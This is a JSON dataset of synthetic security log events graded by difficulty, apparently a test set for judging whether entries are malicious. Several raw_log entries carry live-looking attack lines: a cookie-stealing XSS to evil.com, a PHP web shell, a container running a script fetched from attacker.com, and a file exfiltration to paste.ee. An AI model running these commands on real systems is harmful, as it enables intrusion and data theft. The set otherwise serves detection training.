@@ -1,0 +1,587 @@
+[
+  {
+    "id": "EASY-001",
+    "timestamp": "2023-10-28T08:05:00Z",
+    "source_ip": "192.168.1.10",
+    "destination_ip": "10.0.0.5",
+    "event_type": "Authentication Success",
+    "severity": "Low",
+    "raw_log": "Oct 28 08:05:00 server-01 sshd[1102]: Accepted publickey for user devops from 192.168.1.10 port 52211 ssh2"
+  },
+  {
+    "id": "EASY-002",
+    "timestamp": "2023-10-28T08:30:15Z",
+    "source_ip": "10.0.0.8",
+    "destination_ip": "10.0.0.9",
+    "event_type": "Health Check",
+    "severity": "Info",
+    "raw_log": "ELB-HealthChecker/2.0; GET /status; 200 OK; 0.003s"
+  },
+  {
+    "id": "EASY-003",
+    "timestamp": "2023-10-28T09:00:01Z",
+    "source_ip": "127.0.0.1",
+    "destination_ip": "127.0.0.1",
+    "event_type": "Cron Job Execution",
+    "severity": "Info",
+    "raw_log": "Oct 28 09:00:01 app-server CRON[3011]: (www-data) CMD (/usr/bin/php /var/www/app/artisan schedule:run)"
+  },
+  {
+    "id": "EASY-004",
+    "timestamp": "2023-10-28T09:15:22Z",
+    "source_ip": "192.168.1.55",
+    "destination_ip": "10.0.3.4",
+    "event_type": "Database Select",
+    "severity": "Low",
+    "raw_log": "LOG:  statement: SELECT id, name, email FROM users WHERE active = true LIMIT 50;"
+  },
+  {
+    "id": "EASY-005",
+    "timestamp": "2023-10-28T10:00:00Z",
+    "source_ip": "10.0.0.20",
+    "destination_ip": "10.0.0.250",
+    "event_type": "File Transfer",
+    "severity": "Low",
+    "raw_log": "rsync: sent 2,340,000 bytes  received 42 bytes  /backups/daily/2023-10-28.tar.gz -> 10.0.0.250:/archive/"
+  },
+  {
+    "id": "EASY-006",
+    "timestamp": "2023-10-28T10:22:11Z",
+    "source_ip": "192.168.1.200",
+    "destination_ip": "10.0.0.50",
+    "event_type": "File Access",
+    "severity": "Low",
+    "raw_log": "SMB2: Read Request File: \\\\FileShare\\Marketing\\Brochures\\Q4_Campaign.pptx Handle: 0x5912"
+  },
+  {
+    "id": "EASY-007",
+    "timestamp": "2023-10-28T11:05:33Z",
+    "source_ip": "198.51.100.44",
+    "destination_ip": "10.0.0.1",
+    "event_type": "VPN Connection",
+    "severity": "Low",
+    "raw_log": "CSCO_VPN: Session started for user 'jsmith'. Group: 'RemoteEngineers'. IP: 198.51.100.44. Duration: 0s."
+  },
+  {
+    "id": "EASY-008",
+    "timestamp": "2023-10-28T11:30:00Z",
+    "source_ip": "10.0.1.15",
+    "destination_ip": "10.0.1.16",
+    "event_type": "Certificate Renewal",
+    "severity": "Info",
+    "raw_log": "certbot[4521]: Certificate renewed for domain app.company.com. Expiry: 2024-01-26T00:00:00Z"
+  },
+  {
+    "id": "EASY-009",
+    "timestamp": "2023-10-28T12:00:10Z",
+    "source_ip": "192.168.1.101",
+    "destination_ip": "10.0.0.5",
+    "event_type": "Password Change",
+    "severity": "Low",
+    "raw_log": "EventID=4723; Task=User Account Management; TargetUserName=bthompson; Status=Success; Actor=bthompson"
+  },
+  {
+    "id": "EASY-010",
+    "timestamp": "2023-10-28T13:45:00Z",
+    "source_ip": "203.0.113.10",
+    "destination_ip": "10.0.5.5",
+    "event_type": "HTTP 200 OK",
+    "severity": "Info",
+    "raw_log": "203.0.113.10 - - [28/Oct/2023:13:45:00 +0000] \"GET /index.html HTTP/1.1\" 200 8821 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\""
+  },
+  {
+    "id": "EASY-011",
+    "timestamp": "2023-10-28T14:01:05Z",
+    "source_ip": "45.33.22.11",
+    "destination_ip": "10.0.5.5",
+    "event_type": "SQL Injection Attempt",
+    "severity": "High",
+    "raw_log": "10.0.5.5 - - [28/Oct/2023:14:01:05 +0000] \"GET /search.php?q=1' UNION SELECT username,password FROM users-- HTTP/1.1\" 200 5122"
+  },
+  {
+    "id": "EASY-012",
+    "timestamp": "2023-10-28T14:15:30Z",
+    "source_ip": "91.108.5.55",
+    "destination_ip": "10.0.5.5",
+    "event_type": "XSS Attempt",
+    "severity": "High",
+    "raw_log": "POST /feedback.php HTTP/1.1 Body=\"name=<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>\""
+  },
+  {
+    "id": "EASY-013",
+    "timestamp": "2023-10-28T14:30:12Z",
+    "source_ip": "103.145.12.99",
+    "destination_ip": "10.0.0.5",
+    "event_type": "SSH Brute Force",
+    "severity": "High",
+    "raw_log": "Oct 28 14:30:12 server-01 sshd[5501]: Failed password for root from 103.145.12.99 port 33821 ssh2 (Repeat 300 times in 60s)"
+  },
+  {
+    "id": "EASY-014",
+    "timestamp": "2023-10-28T15:00:45Z",
+    "source_ip": "10.0.2.15",
+    "destination_ip": "199.201.5.1",
+    "event_type": "C2 Callback",
+    "severity": "Critical",
+    "raw_log": "IDS ALERT: ET TROJAN Meterpreter Reverse HTTPS Shell to 199.201.5.1:443"
+  },
+  {
+    "id": "EASY-015",
+    "timestamp": "2023-10-28T15:20:00Z",
+    "source_ip": "84.15.22.10",
+    "destination_ip": "10.0.5.5",
+    "event_type": "Directory Traversal",
+    "severity": "High",
+    "raw_log": "GET /download.php?file=../../../etc/shadow HTTP/1.1"
+  },
+  {
+    "id": "EASY-016",
+    "timestamp": "2023-10-28T15:45:00Z",
+    "source_ip": "185.200.11.2",
+    "destination_ip": "10.0.0.1",
+    "event_type": "DDoS/SYN Flood",
+    "severity": "Critical",
+    "raw_log": "FIREWALL: DROP TCP 185.200.11.2:* -> 10.0.0.1:443 Flags=SYN Count=12000/sec"
+  },
+  {
+    "id": "EASY-017",
+    "timestamp": "2023-10-28T16:10:00Z",
+    "source_ip": "10.0.2.50",
+    "destination_ip": "10.0.2.50",
+    "event_type": "Ransomware Indicator",
+    "severity": "Critical",
+    "raw_log": "SYSMON EventID=11: FileCreate: C:\\Users\\admin\\Desktop\\README_DECRYPT.txt Process: unknown.exe"
+  },
+  {
+    "id": "EASY-018",
+    "timestamp": "2023-10-28T16:30:22Z",
+    "source_ip": "77.88.55.10",
+    "destination_ip": "10.0.5.5",
+    "event_type": "Remote Code Execution",
+    "severity": "Critical",
+    "raw_log": "POST /api/upload HTTP/1.1 Content-Type: multipart/form-data; filename=\"shell.php\" Content: <?php system($_GET['cmd']); ?>"
+  },
+  {
+    "id": "EASY-019",
+    "timestamp": "2023-10-28T17:00:15Z",
+    "source_ip": "10.0.1.30",
+    "destination_ip": "10.0.1.30",
+    "event_type": "Credential Dumping",
+    "severity": "Critical",
+    "raw_log": "SYSMON EventID=10: Process Access: SourceImage=C:\\Tools\\mimikatz.exe TargetImage=C:\\Windows\\system32\\lsass.exe GrantedAccess=0x1010"
+  },
+  {
+    "id": "EASY-020",
+    "timestamp": "2023-10-28T17:30:00Z",
+    "source_ip": "10.0.3.15",
+    "destination_ip": "8.8.8.8",
+    "event_type": "Known Malware Hash",
+    "severity": "Critical",
+    "raw_log": "AV ALERT: File C:\\Temp\\svchost32.exe SHA256=e99a18c428cb38d5f260853678922e03abd1c0 matched signature: Trojan.GenericKD.46542"
+  },
+  {
+    "id": "MED-001",
+    "timestamp": "2023-10-28T03:15:00Z",
+    "source_ip": "192.168.1.10",
+    "destination_ip": "10.0.0.5",
+    "event_type": "Authentication Success",
+    "severity": "Medium",
+    "raw_log": "Oct 28 03:15:00 server-01 sshd[2201]: Accepted password for user admin from 192.168.1.10 port 49221 ssh2"
+  },
+  {
+    "id": "MED-002",
+    "timestamp": "2023-10-28T09:00:00Z",
+    "source_ip": "10.0.0.50",
+    "destination_ip": "10.0.0.51",
+    "event_type": "High Network Traffic",
+    "severity": "Medium",
+    "raw_log": "NetFlow: Src=10.0.0.50 Dst=10.0.0.51 Proto=TCP SPort=22 DPort=22 Bytes=8500000000 Duration=300s"
+  },
+  {
+    "id": "MED-003",
+    "timestamp": "2023-10-28T10:30:00Z",
+    "source_ip": "192.168.1.75",
+    "destination_ip": "10.0.3.4",
+    "event_type": "Database Query",
+    "severity": "Medium",
+    "raw_log": "LOG:  statement: SELECT * FROM customers; -- executed by app_readonly user, returned 2,450,000 rows"
+  },
+  {
+    "id": "MED-004",
+    "timestamp": "2023-10-28T11:00:15Z",
+    "source_ip": "10.0.1.20",
+    "destination_ip": "10.0.1.21",
+    "event_type": "SMB File Copy",
+    "severity": "Medium",
+    "raw_log": "SMB2: Write Request File: \\\\10.0.1.21\\C$\\Windows\\Temp\\update.exe Handle: 0x7721 Bytes: 4521984"
+  },
+  {
+    "id": "MED-005",
+    "timestamp": "2023-10-28T11:45:00Z",
+    "source_ip": "10.0.2.30",
+    "destination_ip": "52.14.88.200",
+    "event_type": "DNS Query",
+    "severity": "Low",
+    "raw_log": "DNS Query: QName=update.microsoft.com Type=A Response=52.14.88.200"
+  },
+  {
+    "id": "MED-006",
+    "timestamp": "2023-10-28T12:15:30Z",
+    "source_ip": "192.168.1.105",
+    "destination_ip": "10.0.0.5",
+    "event_type": "Sudo Command",
+    "severity": "Medium",
+    "raw_log": "Oct 28 12:15:30 server-01 sudo: devops : TTY=pts/0 ; PWD=/opt/app ; USER=root ; COMMAND=/bin/systemctl restart nginx"
+  },
+  {
+    "id": "MED-007",
+    "timestamp": "2023-10-28T13:00:00Z",
+    "source_ip": "10.0.0.5",
+    "destination_ip": "169.254.169.254",
+    "event_type": "Cloud Metadata Access",
+    "severity": "Medium",
+    "raw_log": "HTTP Request: GET http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role"
+  },
+  {
+    "id": "MED-008",
+    "timestamp": "2023-10-28T13:30:22Z",
+    "source_ip": "10.0.2.10",
+    "destination_ip": "10.0.2.10",
+    "event_type": "Service Installation",
+    "severity": "Medium",
+    "raw_log": "EventID=7045; ServiceName=WindowsUpdateHelper; ImagePath=C:\\ProgramData\\helper.exe; StartType=auto; Account=LocalSystem"
+  },
+  {
+    "id": "MED-009",
+    "timestamp": "2023-10-28T14:00:00Z",
+    "source_ip": "192.168.1.150",
+    "destination_ip": "10.0.5.5",
+    "event_type": "Web Scanning",
+    "severity": "Medium",
+    "raw_log": "Multiple requests from 192.168.1.150: GET /admin, /wp-admin, /phpmyadmin, /manager/html, /.env, /config.php (15 paths in 3 seconds)"
+  },
+  {
+    "id": "MED-010",
+    "timestamp": "2023-10-28T14:20:00Z",
+    "source_ip": "10.0.0.30",
+    "destination_ip": "10.0.0.31",
+    "event_type": "ICMP Sweep",
+    "severity": "Medium",
+    "raw_log": "FIREWALL: ICMP Echo Request 10.0.0.30 -> 10.0.0.1-254 (254 hosts in 2 seconds)"
+  },
+  {
+    "id": "MED-011",
+    "timestamp": "2023-10-28T14:45:15Z",
+    "source_ip": "10.0.1.5",
+    "destination_ip": "10.0.1.5",
+    "event_type": "Scheduled Task Created",
+    "severity": "Medium",
+    "raw_log": "EventID=4698; TaskName=\\Microsoft\\Windows\\Maintenance\\CleanupTask; Action=C:\\Users\\Public\\cleanup.bat; Trigger=Daily 02:00; Creator=SYSTEM"
+  },
+  {
+    "id": "MED-012",
+    "timestamp": "2023-10-28T15:10:00Z",
+    "source_ip": "192.168.1.80",
+    "destination_ip": "10.0.0.5",
+    "event_type": "Authentication Failure",
+    "severity": "Medium",
+    "raw_log": "Oct 28 15:10:00 server-01 sshd[6102]: Failed password for user admin from 192.168.1.80 port 55102 ssh2 (3 attempts)"
+  },
+  {
+    "id": "MED-013",
+    "timestamp": "2023-10-28T15:30:00Z",
+    "source_ip": "10.0.0.5",
+    "destination_ip": "10.0.0.5",
+    "event_type": "Log Deletion",
+    "severity": "High",
+    "raw_log": "EventID=1102; LogName=Security; Message=The audit log was cleared. Subject: admin"
+  },
+  {
+    "id": "MED-014",
+    "timestamp": "2023-10-28T16:00:00Z",
+    "source_ip": "10.0.2.40",
+    "destination_ip": "40.126.1.145",
+    "event_type": "SSL/TLS Connection",
+    "severity": "Low",
+    "raw_log": "TLS Handshake: Client=10.0.2.40 Server=40.126.1.145 SNI=login.microsoftonline.com Version=TLS1.3 Cipher=AES256-GCM"
+  },
+  {
+    "id": "MED-015",
+    "timestamp": "2023-10-28T16:30:00Z",
+    "source_ip": "10.0.1.10",
+    "destination_ip": "10.0.1.10",
+    "event_type": "Registry Modification",
+    "severity": "Medium",
+    "raw_log": "SYSMON EventID=13: Registry Value Set: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdater = C:\\ProgramData\\updater.exe Process: cmd.exe"
+  },
+  {
+    "id": "MED-016",
+    "timestamp": "2023-10-28T17:00:00Z",
+    "source_ip": "192.168.1.90",
+    "destination_ip": "10.0.3.4",
+    "event_type": "Database Query",
+    "severity": "Low",
+    "raw_log": "LOG:  statement: INSERT INTO orders (customer_id, product_id, qty, total) VALUES (4521, 89, 2, 159.98);"
+  },
+  {
+    "id": "MED-017",
+    "timestamp": "2023-10-28T17:30:00Z",
+    "source_ip": "10.0.0.5",
+    "destination_ip": "10.0.0.5",
+    "event_type": "User Account Created",
+    "severity": "Medium",
+    "raw_log": "EventID=4720; TargetUserName=svc_backup$; Actor=admin; Groups=Backup Operators, Remote Desktop Users"
+  },
+  {
+    "id": "MED-018",
+    "timestamp": "2023-10-28T18:00:00Z",
+    "source_ip": "10.0.2.60",
+    "destination_ip": "10.0.2.60",
+    "event_type": "PowerShell Execution",
+    "severity": "Medium",
+    "raw_log": "Windows PowerShell: EventID 4104; ScriptBlockText: Get-ADUser -Filter * -Properties LastLogonDate | Where-Object {$_.LastLogonDate -lt (Get-Date).AddDays(-90)} | Export-Csv C:\\Reports\\inactive_users.csv"
+  },
+  {
+    "id": "MED-019",
+    "timestamp": "2023-10-28T18:30:00Z",
+    "source_ip": "10.0.0.15",
+    "destination_ip": "45.77.65.200",
+    "event_type": "Outbound Connection",
+    "severity": "Medium",
+    "raw_log": "FIREWALL: ALLOW TCP 10.0.0.15:49822 -> 45.77.65.200:4444 NEW"
+  },
+  {
+    "id": "MED-020",
+    "timestamp": "2023-10-28T19:00:00Z",
+    "source_ip": "10.0.1.25",
+    "destination_ip": "10.0.1.25",
+    "event_type": "Process Execution",
+    "severity": "Medium",
+    "raw_log": "SYSMON EventID=1: Process Create: Image=C:\\Windows\\System32\\cmd.exe CommandLine=cmd.exe /c whoami & net localgroup administrators & ipconfig /all ParentImage=C:\\Program Files\\Microsoft Office\\WINWORD.EXE"
+  },
+  {
+    "id": "HARD-001",
+    "timestamp": "2023-10-28T02:30:00Z",
+    "source_ip": "10.0.0.5",
+    "destination_ip": "10.0.0.5",
+    "event_type": "Cron Job Execution",
+    "severity": "Info",
+    "raw_log": "Oct 28 02:30:00 server-01 CRON[8821]: (www-data) CMD (curl -s http://10.0.99.5:8080/update.sh | bash)"
+  },
+  {
+    "id": "HARD-002",
+    "timestamp": "2023-10-28T09:15:00Z",
+    "source_ip": "192.168.1.105",
+    "destination_ip": "10.0.3.4",
+    "event_type": "Database Query",
+    "severity": "Low",
+    "raw_log": "LOG:  statement: SELECT username, email, password_hash, security_question, security_answer FROM users WHERE 1=1 ORDER BY created_at; -- executed by app_service, 45000 rows returned"
+  },
+  {
+    "id": "HARD-003",
+    "timestamp": "2023-10-28T10:00:00Z",
+    "source_ip": "10.0.2.10",
+    "destination_ip": "10.0.2.11",
+    "event_type": "WMI Remote Execution",
+    "severity": "Medium",
+    "raw_log": "SYSMON EventID=1: Process Create: Image=C:\\Windows\\System32\\wbem\\WMIC.exe CommandLine=wmic /node:10.0.2.11 process call create \"cmd.exe /c net user support Password1! /add && net localgroup administrators support /add\" User=DOMAIN\\svc_deploy"
+  },
+  {
+    "id": "HARD-004",
+    "timestamp": "2023-10-28T10:30:00Z",
+    "source_ip": "10.0.0.5",
+    "destination_ip": "10.0.0.5",
+    "event_type": "System Update",
+    "severity": "Info",
+    "raw_log": "{\"eventSource\": \"apt\", \"eventName\": \"Install\", \"package\": \"nmap-7.94\", \"status\": \"Success\", \"user\": \"www-data\"}"
+  },
+  {
+    "id": "HARD-005",
+    "timestamp": "2023-10-28T11:00:00Z",
+    "source_ip": "10.0.1.50",
+    "destination_ip": "172.217.14.99",
+    "event_type": "DNS over HTTPS",
+    "severity": "Low",
+    "raw_log": "TLS Handshake: Client=10.0.1.50 Server=172.217.14.99 SNI=dns.google Version=TLS1.3; Subsequent POST requests: avg 450 bytes every 30s for 2 hours"
+  },
+  {
+    "id": "HARD-006",
+    "timestamp": "2023-10-28T11:30:00Z",
+    "source_ip": "10.0.0.5",
+    "destination_ip": "10.0.0.5",
+    "event_type": "SSH Key Generation",
+    "severity": "Low",
+    "raw_log": "Oct 28 11:30:00 server-01 sshd[9102]: Authorized key added: SHA256:xK9f2... for user root in /root/.ssh/authorized_keys by user www-data"
+  },
+  {
+    "id": "HARD-007",
+    "timestamp": "2023-10-28T12:00:00Z",
+    "source_ip": "10.0.2.20",
+    "destination_ip": "10.0.2.20",
+    "event_type": "Scheduled Task Modified",
+    "severity": "Low",
+    "raw_log": "EventID=4702; TaskName=\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update; Action changed from=C:\\Windows\\System32\\UsoClient.exe to=C:\\Windows\\System32\\UsoClient.exe && C:\\ProgramData\\helper.exe; Modifier=SYSTEM"
+  },
+  {
+    "id": "HARD-008",
+    "timestamp": "2023-10-28T12:30:00Z",
+    "source_ip": "10.0.1.30",
+    "destination_ip": "10.0.1.30",
+    "event_type": "Process Execution",
+    "severity": "Low",
+    "raw_log": "SYSMON EventID=1: Process Create: Image=C:\\Windows\\System32\\certutil.exe CommandLine=certutil -urlcache -split -f http://cdn-static.company.com/fonts/arial.woff2 C:\\Windows\\Temp\\arial.woff2 ParentImage=C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+    "id": "HARD-009",
+    "timestamp": "2023-10-28T13:00:00Z",
+    "source_ip": "10.0.0.100",
+    "destination_ip": "10.0.0.5",
+    "event_type": "Kerberos Ticket Request",
+    "severity": "Low",
+    "raw_log": "EventID=4769; ServiceName=krbtgt/DOMAIN.LOCAL; TicketOptions=0x40810010; TicketEncryptionType=0x17 (RC4-HMAC); ClientAddress=10.0.0.100; Status=0x0"
+  },
+  {
+    "id": "HARD-010",
+    "timestamp": "2023-10-28T13:30:00Z",
+    "source_ip": "10.0.2.70",
+    "destination_ip": "10.0.2.70",
+    "event_type": "Process Execution",
+    "severity": "Low",
+    "raw_log": "SYSMON EventID=1: Process Create: Image=C:\\Windows\\System32\\rundll32.exe CommandLine=rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\dump.bin full ParentImage=C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+    "id": "HARD-011",
+    "timestamp": "2023-10-28T14:00:00Z",
+    "source_ip": "10.0.1.40",
+    "destination_ip": "10.0.1.40",
+    "event_type": "File System Activity",
+    "severity": "Low",
+    "raw_log": "SYSMON EventID=11: FileCreate: TargetFilename=C:\\Windows\\System32\\drivers\\ndis_monitor.sys Process: C:\\Windows\\System32\\sc.exe"
+  },
+  {
+    "id": "HARD-012",
+    "timestamp": "2023-10-28T14:30:00Z",
+    "source_ip": "192.168.1.120",
+    "destination_ip": "10.0.5.5",
+    "event_type": "API Request",
+    "severity": "Low",
+    "raw_log": "POST /api/v2/users/export HTTP/1.1 Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJ1c2VyIn0.xxx X-Forwarded-For: 192.168.1.120 Response: 200 Records: 50000"
+  },
+  {
+    "id": "HARD-013",
+    "timestamp": "2023-10-28T15:00:00Z",
+    "source_ip": "10.0.0.5",
+    "destination_ip": "10.0.0.5",
+    "event_type": "Container Activity",
+    "severity": "Info",
+    "raw_log": "docker[4521]: Container started: image=alpine:latest name=maintenance_job cmd='sh -c \"apk add curl && curl -s attacker.com/rev.sh | sh\"' --privileged --pid=host --network=host"
+  },
+  {
+    "id": "HARD-014",
+    "timestamp": "2023-10-28T15:30:00Z",
+    "source_ip": "10.0.2.80",
+    "destination_ip": "10.0.3.4",
+    "event_type": "Database Query",
+    "severity": "Low",
+    "raw_log": "LOG:  statement: UPDATE users SET email='admin@legit-company.com' WHERE username='admin'; -- executed by migration_svc"
+  },
+  {
+    "id": "HARD-015",
+    "timestamp": "2023-10-28T16:00:00Z",
+    "source_ip": "10.0.1.60",
+    "destination_ip": "10.0.1.60",
+    "event_type": "Process Execution",
+    "severity": "Low",
+    "raw_log": "SYSMON EventID=1: Process Create: Image=C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe CommandLine=MSBuild.exe C:\\Users\\Public\\Documents\\project.csproj ParentImage=explorer.exe"
+  },
+  {
+    "id": "HARD-016",
+    "timestamp": "2023-10-28T16:30:00Z",
+    "source_ip": "10.0.0.5",
+    "destination_ip": "10.0.0.5",
+    "event_type": "PAM Configuration",
+    "severity": "Low",
+    "raw_log": "Oct 28 16:30:00 server-01 pam_unix[10221]: /etc/pam.d/sshd modified: added 'auth sufficient pam_permit.so' before pam_unix.so by user root"
+  },
+  {
+    "id": "HARD-017",
+    "timestamp": "2023-10-28T17:00:00Z",
+    "source_ip": "10.0.2.90",
+    "destination_ip": "10.0.2.90",
+    "event_type": "PowerShell Execution",
+    "severity": "Low",
+    "raw_log": "Windows PowerShell: EventID 4104; ScriptBlockText: $data = [IO.File]::ReadAllBytes('C:\\Confidential\\client_data.xlsx'); $enc = [Convert]::ToBase64String($data); Invoke-WebRequest -Uri 'https://paste.ee/api' -Method POST -Body @{content=$enc; syntax='text'}"
+  },
+  {
+    "id": "HARD-018",
+    "timestamp": "2023-10-28T17:30:00Z",
+    "source_ip": "10.0.0.5",
+    "destination_ip": "10.0.0.5",
+    "event_type": "Git Operation",
+    "severity": "Low",
+    "raw_log": "Oct 28 17:30:00 server-01 git[11001]: clone https://github.com/company/infrastructure.git --depth 1 /tmp/.cache/fonts/ by user deploy"
+  },
+  {
+    "id": "HARD-019",
+    "timestamp": "2023-10-28T18:00:00Z",
+    "source_ip": "10.0.1.70",
+    "destination_ip": "10.0.1.70",
+    "event_type": "Windows Event",
+    "severity": "Low",
+    "raw_log": "EventID=4657; ObjectName=HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest; ValueName=UseLogonCredential; NewValue=DWORD(1); Process=reg.exe; User=NT AUTHORITY\\SYSTEM"
+  },
+  {
+    "id": "HARD-020",
+    "timestamp": "2023-10-28T18:30:00Z",
+    "source_ip": "10.0.0.5",
+    "destination_ip": "10.0.0.5",
+    "event_type": "SSH Configuration",
+    "severity": "Low",
+    "raw_log": "Oct 28 18:30:00 server-01 auditd[1201]: /etc/ssh/sshd_config modified: PermitRootLogin changed from 'no' to 'yes', PasswordAuthentication changed from 'no' to 'yes', MaxAuthTries changed from '3' to '99' by user root"
+  },
+  {
+    "id": "HARD-021",
+    "timestamp": "2023-10-28T03:00:00Z",
+    "source_ip": "10.0.0.5",
+    "destination_ip": "10.0.0.5",
+    "event_type": "Process Execution",
+    "severity": "Medium",
+    "raw_log": "SYSMON EventID=1: Process Create: Image=C:\\Windows\\System32\\certutil.exe CommandLine=certutil -verifyctl -f -split AuthRootCAUpdate.p7b ParentImage=C:\\Windows\\System32\\svchost.exe"
+  },
+  {
+    "id": "HARD-022",
+    "timestamp": "2023-10-28T02:00:00Z",
+    "source_ip": "10.0.2.10",
+    "destination_ip": "10.0.2.10",
+    "event_type": "PowerShell Execution",
+    "severity": "Medium",
+    "raw_log": "Windows PowerShell: EventID 4104; ScriptBlockText: $cred = Get-StoredCredential -Target 'BackupSvc'; $sess = New-PSSession -ComputerName DC01 -Credential $cred; Invoke-Command -Session $sess -ScriptBlock { Get-ADUser -Filter {PasswordLastSet -lt (Get-Date).AddDays(-180)} | Disable-ADAccount }; Remove-PSSession $sess"
+  },
+  {
+    "id": "HARD-023",
+    "timestamp": "2023-10-28T04:15:00Z",
+    "source_ip": "10.0.0.5",
+    "destination_ip": "10.0.0.5",
+    "event_type": "Log Deletion",
+    "severity": "High",
+    "raw_log": "EventID=1102; LogName=Application; Message=The Application log file was cleared. Subject: svc_logrotate; Followed by EventID=104: Log file rotated to \\\\LogArchive\\2023\\Oct\\Application-20231028.evtx"
+  },
+  {
+    "id": "HARD-024",
+    "timestamp": "2023-10-28T01:30:00Z",
+    "source_ip": "10.0.1.80",
+    "destination_ip": "10.0.1.1",
+    "event_type": "Port Scan",
+    "severity": "High",
+    "raw_log": "FIREWALL: TCP SYN 10.0.1.80 -> 10.0.1.1-254:22,80,443,3306,5432,8080,8443 (1778 connection attempts in 120s) User-Agent: Qualys/Scanner/12.4"
+  },
+  {
+    "id": "HARD-025",
+    "timestamp": "2023-10-28T05:00:00Z",
+    "source_ip": "10.0.0.5",
+    "destination_ip": "169.254.169.254",
+    "event_type": "Cloud Metadata Access",
+    "severity": "Medium",
+    "raw_log": "HTTP Request: GET http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-AppRole Headers: X-aws-ec2-metadata-token: AQAEAHjK... (IMDSv2) Process: /opt/app/bin/credential-refresher PID: 4521 User: app_service"
+  }
+]
